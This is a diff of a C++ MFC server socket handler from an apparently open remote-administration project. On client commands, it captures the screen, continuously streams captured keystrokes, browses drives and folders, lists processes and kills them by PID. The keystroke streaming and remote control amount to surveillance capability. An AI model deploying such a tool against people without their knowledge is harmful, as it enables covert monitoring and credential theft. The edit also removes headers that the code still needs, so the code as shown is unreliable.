@@ -1,15 +1,9 @@
-// ReceivingSocket.cpp : implementation file
+﻿// ReceivingSocket.cpp : implementation file
 //
 
 #include "pch.h"
 #include "Server.h"
 #include "ReceivingSocket.h"
-#include <filesystem>
-#include <iostream>
-
-#include "UtilScreenCapture.h"
-#include "UtilKeystroke.h"
-#include "UtilBrowseDirectory.h"
 
 #define PRE_AGREED_PORT     8686
 #define SEND_BUFFER_SIZE    4096
@@ -17,6 +11,22 @@
 
 namespace fs = std::filesystem;
 
+std::string getFirstWord(char* str) {
+    std::string firstWord;
+    int i = 0;
+    while (str[i] != '\0' && str[i] != ' ') {
+        firstWord += str[i];
+        i++;
+    }
+    return firstWord;
+}
+
+std::string getSecondWord(char* input) {
+    std::istringstream iss(input);
+    std::string word1, word2;
+    iss >> word1 >> word2;
+    return word2;
+}
 
 // CReceivingSocket
 
@@ -29,25 +39,60 @@ CReceivingSocket::~CReceivingSocket()
 {
 }
 
+std::string getFirstWord(const char* str) {
+    std::string firstWord;
+    int i = 0;
+    while (str[i] != '\0' && str[i] != ' ') {
+        firstWord += str[i];
+        i++;
+    }
+    return firstWord;
+}
+
+std::string getSecondWord(const char* input) {
+    std::istringstream iss(input);
+    std::string word1, word2;
+    iss >> word1 >> word2;
+    return word2;
+}
+
 void CReceivingSocket::OnReceive(int nErrorCode)
 {
-	// TODO: Add your specialized code here and/or call the base class
-    char msg[256] = "";
-	this->Receive(msg, 256);
-    ((CServerApp*)AfxGetApp())->m_pServerView->AddMsg(msg);
+    char buffer[256] = "";
+	this->Receive(buffer, 256);
+    buffer[strlen(buffer)] = '\0';
+    
+    CStringA strMsg(buffer); AfxMessageBox(strMsg);
+    int len = MultiByteToWideChar(CP_UTF8, 0, strMsg, -1, NULL, 0);
+    CStringW wstrMsg;
+    int wideLen = MultiByteToWideChar(CP_UTF8, 0, strMsg, -1, wstrMsg.GetBuffer(len), len); MessageBoxW(nullptr, wstrMsg, L"Server", MB_OK);
 
-	if (strcmp(msg, "REQ_CSCR") == 0)
+	if (L"REQ_CSCR" == wstrMsg)
 	{
 		OnReceiveCapScreen(nErrorCode);
 	}
-    else if (strcmp(msg, "REQ_KSTR") == 0)
+    else if (L"REQ_KSTR" == wstrMsg)
     {
         OnReceiveKeystroke(nErrorCode);
     }
-	else if (strcmp(msg, "REQ_BDIR") == 0)
+	else if (L"REQ_BDIR" == wstrMsg)
 	{
-        OnReceiveBrowseDir(nErrorCode);
+        OnReceiveBrowseDisk(nErrorCode);
 	}
+    else if (strMsg.Left(CString("REQ_BDIR").GetLength()) == CString("REQ_BDIR"))
+    {
+        std::wstring wstrMsg_s(wstrMsg);
+        OnReceiveBrowseDir(nErrorCode, (wstrMsg_s.substr(8, wstrMsg_s.length() - 8).c_str()));
+    }
+    else if (L"REQ_SPRO" == wstrMsg)
+    {
+        OnReceiveShowPro(nErrorCode);
+    }
+    else if (getFirstWord(strMsg) == "REQ_SPRO_KILL") {
+        std::string PID = getSecondWord(strMsg);
+        int Pid = std::stoi(PID);
+        OnReceiveShowPro_Kill(nErrorCode, Pid);
+    }
 	CSocket::OnReceive(nErrorCode);
 }
 
@@ -63,8 +108,6 @@ void CReceivingSocket::OnClose(int nErrorCode)
 BOOL CReceivingSocket::OnReceiveCapScreen(int nErrorCode)
 {
 	ScreenCapture();
-
-
     // return value
     BOOL bRet = TRUE;
     // used to monitor the progress of a sending operation
@@ -168,9 +211,6 @@ BOOL CReceivingSocket::OnReceiveCapScreen(int nErrorCode)
 
     } while (cbLeftToSend > 0);
 
-    AfxMessageBox("file sent successfully");
-
-
 PreReturnCleanup: // labelled goto destination
 
     // free allocated memory
@@ -192,6 +232,7 @@ PreReturnCleanup: // labelled goto destination
 void CReceivingSocket::OnReceiveKeystroke(int nErrorCode)
 {
     // Continuously send the name of the keystroke that has been tapped to the client
+    // while (flag)
     while (1)
     {   
         CString keystrokeName(Keystroke().c_str()); 
@@ -204,14 +245,112 @@ void CReceivingSocket::OnReceiveKeystroke(int nErrorCode)
     //this->Close();
 }
 
-void CReceivingSocket::OnReceiveBrowseDir(int nErrorCode) 
+BOOL CReceivingSocket::OnReceiveBrowseDisk(int nErrorCode)
 {
-    //CString dirs(BrowseDirectory().c_str());
-    //this->Send(dirs.GetBuffer(dirs.GetLength()), dirs.GetLength());
+    std::vector<CStringW> diskList;
+    BrowseDisk(diskList);
 
-    std::vector<std::tuple<CString, CString>> folderList;
-    std::vector<std::tuple<CString, CString, CString>> fileList;
-    BrowseDirectory("D:", folderList, fileList);
-    AfxMessageBox("D:\\");
+    // return value
+    BOOL bRet = TRUE;
+
+    CStringW wmsg = L"";
+    for (CStringW disk : diskList) {
+        wmsg = wmsg + disk + L"\n";
+    }
+
+    // Convert the CStringW object to a UTF - 8 encoded byte buffer using the WideCharToMultiByte
+    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wmsg, wmsg.GetLength(), NULL, 0, NULL, NULL);
+    std::vector<char> msg(bufferSize);
+    WideCharToMultiByte(CP_UTF8, 0, wmsg, wmsg.GetLength(), msg.data(), bufferSize, NULL, NULL);
+    int cbBytesSent = this->Send(msg.data(), msg.size());
+
+    // test for errors and get out if they occurred
+    if (cbBytesSent == SOCKET_ERROR)
+    {
+        int iErr = ::GetLastError();
+        TRACE("SendFileToRemoteRecipient returned a socket error while sending file length\n"
+            "\tNumber of Bytes sent = %d\n"
+            "\tGetLastError = %d\n", cbBytesSent, iErr);
+        bRet = FALSE;
+        return bRet;
+    }
+    return bRet;
 }
+
+void CReceivingSocket::OnReceiveBrowseDir(int nErrorCode, CStringW path) 
+{
+    std::vector<CStringW> dirList;
+    BOOL browsable = BrowseDir(path, dirList);
+    
+    if (browsable)
+    {
+        CStringW wmsg = L"";
+        for (auto dir : dirList) {
+            CStringW formattedDir;
+            formattedDir.Format(L"%s\n", dir.GetString());
+            wmsg += formattedDir;
+        }   
+
+        AfxMessageBox(std::to_string(dirList.size()).c_str());              // 96
+        MessageBoxW(nullptr, wmsg, L"SV", MB_OK);
+
+        // Convert the CStringW object to a UTF - 8 encoded byte buffer using the WideCharToMultiByte
+        int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wmsg, wmsg.GetLength(), NULL, 0, NULL, NULL);
+        std::vector<char> msg(bufferSize);
+        WideCharToMultiByte(CP_UTF8, 0, wmsg, wmsg.GetLength(), msg.data(), bufferSize, NULL, NULL);
+        int cbBytesSent = this->Send(msg.data(), msg.size());
+    }
+    else
+    {
+        CString msg = "Invalid path!";
+        this->Send(msg.GetBuffer(msg.GetLength()), msg.GetLength());
+        AfxMessageBox(msg);
+    }
+}
+
+bool CReceivingSocket::OnReceiveShowPro_Kill(int nErrorCode, int Pid) {
+    return killProcess(Pid);
+}
+
+void CReceivingSocket::OnReceiveShowPro(int nErrorCode) {
+    CString msg = "";
+
+    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+        msg = "Failed to create process snapshot.\n";
+        Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
+        return;
+    }
+
+    // Initialize the PROCESSENTRY32 structure
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    // Retrieve information about the first process
+    if (!Process32First(hProcessSnap, &pe32)) {
+        msg = "Failed to retrieve process information.";
+        Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
+        CloseHandle(hProcessSnap);
+        return;
+    }
+
+    // Print the process ID and process name of each process
+    do {
+        std::string processName(pe32.szExeFile);
+        if (processName != "System Idle Process" && processName != "System") {
+            CString processIdStr;
+            processIdStr.Format(_T("%d"), pe32.th32ProcessID);
+            CString processNameStr(processName.c_str());
+            msg = msg + processNameStr.GetString() + "/" + processIdStr.GetString() + "/";
+        }
+    } while (Process32Next(hProcessSnap, &pe32));
+
+    // Close the process snapshot handle
+    CloseHandle(hProcessSnap);
+
+    //MessageBox((LPCTSTR)msg, "Server");
+
+    Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
+}
+
 
